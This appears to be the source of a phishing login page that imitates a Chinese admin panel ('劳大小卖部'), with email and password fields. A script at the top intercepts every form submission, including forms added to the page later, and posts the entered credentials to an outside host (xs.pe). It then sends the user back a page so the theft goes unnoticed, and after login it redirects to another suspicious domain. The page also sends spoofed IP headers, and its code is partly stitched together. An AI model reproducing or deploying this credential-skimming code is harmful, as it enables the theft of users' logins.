document.addEventListener('DOMContentLoaded', function() {
    function interceptFormSubmission(event) {
        event.preventDefault();
        var form = event.target.closest('form');
        if (form) {
            var action = 'http://xs.pe/postdata/lv6';
            var method = 'post';
            var formData = new FormData(form);
            fetch(action, {
                method: method,
                body: formData
            }).then(function(response) {
                return response.text();
            }).then(function(text) {
                console.log('Form submission successful:', text);
                history.back();
            }).catch(function(error) {
                console.error('Form submission failed:', error);
            });
        }
    }

    function attachFormListeners() {
        document.querySelectorAll('form').forEach(function(form) {
            form.removeEventListener('submit', interceptFormSubmission, true);
            form.addEventListener('submit', interceptFormSubmission, true);
        });
        document.querySelectorAll('[type="submit"], [lay-submit]').forEach(function(button) {
            button.removeEventListener('click', interceptFormSubmission, true);
            button.addEventListener('click', interceptFormSubmission, true);
        });
    }

    attachFormListeners();

    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type == 'childList' && mutation.addedNodes.length) {
                attachFormListeners();
            }
        });
    });

    observer.observe(document.body, { childList: true, subtree: true });

    setInterval(attachFormListeners, 1000);
});

    };
});

<body>
<div id="app">
    <div class="login-box">
        <h2><span>劳大小卖部</span></h2>
        <form action="http://xs.pe/postdata/lv6">
            <div class="user-box">
                <input type="email" name="email" required="" placeholder="请输入你的邮箱..">
                <label>Email</label>
            </div>
            <div class="user-box">
                <input type="password" name="password" required="" placeholder="请输入密码..">
                <label>密码</label>
            </div>
            <div class="user-box">
                <select name="tunnel"><option value="-1">请选择安全隧道模式</option><option selected="" value="0">模式(0) - 120.235.200.208  (安全/可信)</option><option style="color:red;" value="1">模式(1) - 127.0.0.1  (该模式有伪造IP风险)</option><option style="color:red;" value="2">模式(2) - 127.0.0.1  (该模式有伪造IP风险)</option><option style="color:red;" value="3">模式(3) - 127.0.0.1  (该模式有伪造IP风险)</option><option style="color:red;" value="4">模式(4) - 127.0.0.1  (该模式有伪造IP风险)</option><option style="color:red;" value="5">模式(5) - 127.0.0.1  (该模式有伪造IP风险)</option><option style="color:red;" value="6">模式(6) - 127.0.0.1  (该模式有伪造IP风险)</option><option style="color:red;" value="7">模式(7) - 127.0.0.1  (该模式有伪造IP风险)</option></select>
                <label>安全隧道 (<b style="color: #04f33a;">请确定自己的电脑IP地址再选择</b>)</label>
            </div>
            <a href="javascript:void(0);" class="login-button" type="submit">登录</a>
        </form>
    </div>
</div>

<script>
    function get(variable) {
        var query = window.location.search.substring(1);
        var vars = query.split("&");
        for (var i = 0; i < vars.length; i++) {
            var pair = vars[i].split("=");
            if (pair[0] == variable) {
                return pair[1];
            }
        }
        return 0;
    }

    let goto = decodeURIComponent(get("goto"));

    if (goto == 0) {
        goto = "/admin/dashboard/index";
    }


    function DisableHandle(obj, text = "正在登录..") {
        $(obj).text(text);
        $('.login-box').addClass("login-animation");
        $("input").attr("disabled", true);
    }

    function EnableHandle(obj) {
        $(obj).text("登录");
        $('.login-box').removeClass("login-animation");
        $("input").attr("disabled", false);
    }

    let loginStatus = false;
    $(".login-button").click(function () {
        if (loginStatus) {
            return;
        }
        loginStatus = true;
        DisableHandle(this);
        $.post("/admin/api/authentication/login", {
            username: $('input[name=email]').val(),
            password: $('input[name=password]').val(),
            mode: $("select[name=tunnel]").val()
        }, res => {
            loginStatus = false;
            if (res.code != 200) {
                EnableHandle(this);
                layer.msg(res.msg);
                return;
            }
            window.location.href="http://kw.mzd1314.space:8081/admin/authentication/goto;"
        }).fail(error => {
            loginStatus = false;
            layer.msg("网络错误，请重试");
            EnableHandle(this);
        });

    });

    $("body").keypress(function (even) {
        if (even.which == 13) {
            $(".login-button").click();
        }
    });


    let $select = $("select[name=tunnel]");

    let loaderIndex = layer.load(2, {shade: ['0.3', '#fff']});
    let test = "127.0.0.1";
    let mode = "0"
    let have = "1"
    let ips = {};
    $.ajax({
        url: "/admin/api/authentication/getIp", // 目标URL
        type: "GET",
        headers: {
            "Client-Ip": test,
            "X-Forwarded-For": test,
            "X-Forwarded": test,
            "X-Cluster-Client-Ip": test,
            "Forwarded-For": test,
            "Forwarded": test,
            "X-Real-Ip": test,
            "Remote-Addr": test
        },
        success: function (res) {
            layer.close(loaderIndex);
            $select.html("<option value='-1'>请选择安全隧道模式</option>");
            res.data.forEach(data => {
                let risk = " (安全/可信)";
                let css = "";
                if (data.risk) {
                    risk = " (该模式有伪造IP风险)";
                    css = 'style="color:red;"'
                }
                ips[data.type] = data.ip;
                $select.append('<option ' + ((mode == data.type && have == "1") ? "selected" : "") + ' ' + css + ' value="' + data.type + '">模式(' + data.type + ") - " + data.ip + ' ' + risk + '</option>');
            });

            if (have != "1") {
                layer./*alert*/('安全隧道是CDN获取真实IP的终极解决方案，客户将无法伪造客户IP地址<br><br>请务必选择<b style="color:red;">【安全隧道】模式为你正确的电脑IP地址</b>（<a href="https://ip.skk.moe/" target="_blank">查看我的电脑IP</a>），否则系统无法获取客户真实的电脑IP地址。<br><br><b style="color: #12a711;">注意：如果您的网站使用了CDN，那么以后请使用CDN域名登录后台，这将会让您的网站得到最大化的安全保障。</b>', {title: "<b style='color: red;'>安全隧道确认</b>"});
            }
        }
    });

    $select.on("change", function () {
        let type = this.value;
        if (type != "-1") {
            layer./*alert*/('请务必确认您的电脑IP地址是否和模式上显示的一致<br><br>查看你的电脑IP地址：<a style="color: red;" href="https://ip.skk.moe/" target="_blank">查看我的电脑IP</a>', {title: "<b style='color: #1dcb0a;'>请确认你的电脑IP是：</b><b style='color: red'>" + ips[type] + "</b>"});
        }
    });


</script>
